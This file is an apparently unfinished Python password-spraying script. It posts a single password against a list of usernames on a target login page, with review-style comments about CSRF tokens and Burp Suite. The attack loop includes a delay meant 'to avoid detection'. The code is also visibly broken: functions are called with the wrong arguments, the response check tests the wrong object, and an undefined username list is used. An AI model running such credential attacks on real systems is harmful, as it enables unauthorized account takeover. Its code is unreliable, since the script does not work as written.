# This script isnt designed to be used outside the context of an engagement, as osint must be done into
# org passwords and the formatting they use for user names & email (first.last, first, last.first etc.)

import time as t
import requests as r
from sys import exit
            
def passwordSpray(password: str, url: str) -> bool:
    csrf = []
    #frameworkChecker(framework)
    print("""
     _____ _               _____                       _  ______            _        __                   
    /  __ | |             |  ___|                     | | | ___ \          | |      / _|                  
    | /  \| | __ _ ___ ___| |__ _ __ __ _ ___  ___  __| | | |_/ /_ __ _   _| |_ ___| |_ ___  _ __ ___ ___ 
    | |   | |/ _` / __/ __|  __| '__/ _` / __|/ _ \/ _` | | ___ | '__| | | | __/ _ |  _/ _ \| '__/ __/ _ \\
    | \__/| | (_| \__ \__ | |__| | | (_| \__ |  __| (_| | | |_/ | |  | |_| | ||  __| || (_) | | | (_|  __/
     \____|_|\__,_|___|___\____|_|  \__,_|___/\___|\__,_| \____/|_|   \__,_|\__\___|_| \___/|_|  \___\___|\n\n""")
    
    for username in usernames:
        username = username.replace(" ", "")
        print(f"Trying:", {username})                                               # Interesting, I will investigate what is the best to call
        data = {"username": username,"password": password,"login":"submit"} # login value will only work for very few back-end oriented auth systems
        response = r.post(url, data=data)
        
        if not r.ok:
            #Code here for debug, if I move unsuccessful passwords out, then the final list is self-documenting.
            print(username.pop(username))
            t.sleep(5) # wait to avoid detection
            pass
        
        for i in csrf:    
            if csrf in str(response.content): # use burp suite proxy or OWASP ZAP instead
                                                    # I sorta get what you're saying here, but I don't understand the benefits. Am I correct to say, init the dictionary and then save headers response into that dict to be looked at further?
                print("CSRF token detected") # you can add headers like: response = requests.post(url, data=data, headers=headers) and create a headers dict for the CSRF token
                return False
                #response = 
        
        else:
            print(f"Success: Username: ---> ", {username}, "\n", "Password: ---> ", {password})
            return True


if __name__ == '__main__':

    #REMEMBER THIS IS NOT FOR USE WITHOUT PREVIOUS INFORMATION GATHERING
    #Use Burp Suite Proxy to identify the implementation of csrf, its much simpler than
    #trying to look for all these different frameworks from python GET requests
    
    url = input("Enter Target Url: ")
    password = input("Enter Target Password: ")
    error = input("Enter Wrong User Error Message: ")    
    
    try:
        passwordSpray()
    except r.exceptions.HTTPError as err:
        print(f'There was an error: {err}')
    except r.exceptions.RequestException as err:
        print(f'There was an error: {err}')

    #compile list from engagement notes
    with open("usernames.txt", "r") as usernames:
        passwordSpray(password,url,error)
    
    print("[!!] Username not in list")